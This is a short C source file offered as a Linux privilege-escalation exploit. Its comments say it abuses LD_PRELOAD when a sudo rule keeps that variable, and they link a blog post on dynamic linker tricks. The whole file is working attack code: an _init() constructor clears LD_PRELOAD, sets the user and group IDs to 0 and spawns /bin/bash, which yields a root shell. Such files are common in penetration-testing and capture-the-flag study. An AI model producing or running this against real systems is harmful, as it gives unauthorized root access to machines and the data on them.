 #include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

// use this to exploit LD_PRELOAD when sudo -l allows env_keep+=LD_PRELOAD
// visit
// https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
// for more on LD_PRELOAD


void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
} 
